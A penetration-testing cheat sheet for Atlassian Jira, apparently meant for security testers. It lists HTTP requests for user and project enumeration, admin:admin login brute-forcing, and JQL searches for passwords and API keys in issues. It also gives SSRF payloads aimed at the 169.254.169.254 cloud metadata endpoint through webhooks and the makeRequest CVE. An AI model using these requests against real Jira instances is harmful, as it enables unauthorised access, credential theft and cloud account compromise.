# Jira Security Testing

## Overview
Security testing for Atlassian Jira instances including authentication, information disclosure, and SSRF vulnerabilities.

## Reconnaissance
```
# Version detection
GET /rest/api/2/serverInfo → Jira version, baseUrl
GET /rest/api/latest/serverInfo

# User enumeration
GET /rest/api/2/user?username=admin
GET /rest/api/2/user/search?username=

# Project enumeration
GET /rest/api/2/project

# Check if anonymous access enabled
GET /rest/api/2/myself → if returns user info without auth
```

## Authentication
```
# Default Jira login
/login.jsp
/secure/Dashboard.jspa

# API auth
Authorization: Basic base64(user:pass)
Authorization: Bearer TOKEN

# Brute force API
POST /rest/auth/1/session
{"username":"admin","password":"admin"}
```

## Information Disclosure

### Exposed API Endpoints
```
# List all projects (may expose internal projects)
GET /rest/api/2/project
GET /rest/api/2/project?expand=description

# List users (often publicly accessible)
GET /rest/api/2/user/search?username=
GET /rest/api/2/user/search?query=

# List issues in project (may expose sensitive tickets)
GET /rest/api/2/search?jql=project=PROJ

# List boards
GET /rest/agile/1.0/board

# Dashboard gadgets
GET /rest/gadget/1.0/gadgetResource
```

### Global Search
```
# JQL (Jira Query Language) for searching
GET /rest/api/2/search?jql=text~"password"
GET /rest/api/2/search?jql=text~"secret"
GET /rest/api/2/search?jql=text~"api_key"
GET /rest/api/2/search?jql=text~"credentials"

# Search for specific issue types
GET /rest/api/2/search?jql=issuetype=Bug+AND+text~"SQL+injection"
```

## SSRF via Jira

### SSRF via Webhooks
```
# If can create webhooks:
POST /rest/webhooks/1.0/webhook
{"name":"test","url":"http://169.254.169.254/latest/meta-data/","jqlFilter":"","events":["jira:issue_created"]}

# Trigger webhook by creating an issue
```

### SSRF via Issue Attachments
```
# Remote links in issues
POST /rest/api/2/issue/ISSUE-1/remotelink
{"object":{"url":"http://internal-service/","title":"Test"}}
# Server may fetch URL to generate preview
```

### SSRF via Gadgets
```
# Jira dashboard gadgets make server-side requests
# Custom gadget with URL → potential SSRF
```

## CVE Vulnerabilities
```
# CVE-2022-0540: Jira < 8.13.18 — authentication bypass
# CVE-2021-26086: Jira path traversal
# CVE-2020-14179: Jira information disclosure
# CVE-2019-8449: User enumeration in Jira
# CVE-2019-8451: SSRF via the /plugins/servlet/gadgets/makeRequest endpoint

# Check makeRequest endpoint:
GET /plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/

# Check confluence-user-management endpoint (older versions)
GET /rest/api/2/user?username=admin
```

## Jira SSRF via Service Management
```
# Jira Service Management (formerly Service Desk) 
# Customer portal may expose additional attack surface

# SSRF via customer request attachments
# Webhooks in automation rules
```

## Privilege Escalation
```
# User role manipulation
PUT /rest/api/2/user/role
# Check if user can modify own role/permissions

# Group membership
GET /rest/api/2/group/member?groupname=jira-administrators

# API token abuse
POST /rest/auth/1/session  # with stolen/brute-forced credentials
```

## Plugin Vulnerabilities
```
# Atlassian Marketplace plugins often have vulnerabilities
# Third-party plugins may have SQLi, XSS, SSRF
# Check installed plugins:
GET /rest/plugins/1.0/

# Common vulnerable plugins: ScriptRunner, JMWE, EazyBI
```

## Testing Methodology
1. Check version via /rest/api/2/serverInfo
2. Test anonymous API access
3. Enumerate users via user search API
4. Check makeRequest SSRF endpoint
5. Test JQL injection in search queries
6. Look for sensitive data via global search
7. Test webhook creation for SSRF
8. Check for CVE-specific vulnerabilities based on version
9. Test authentication endpoints

## Tools
- `nuclei -t jira/` templates
- Burp Suite for API testing
- Custom scripts for JQL injection testing
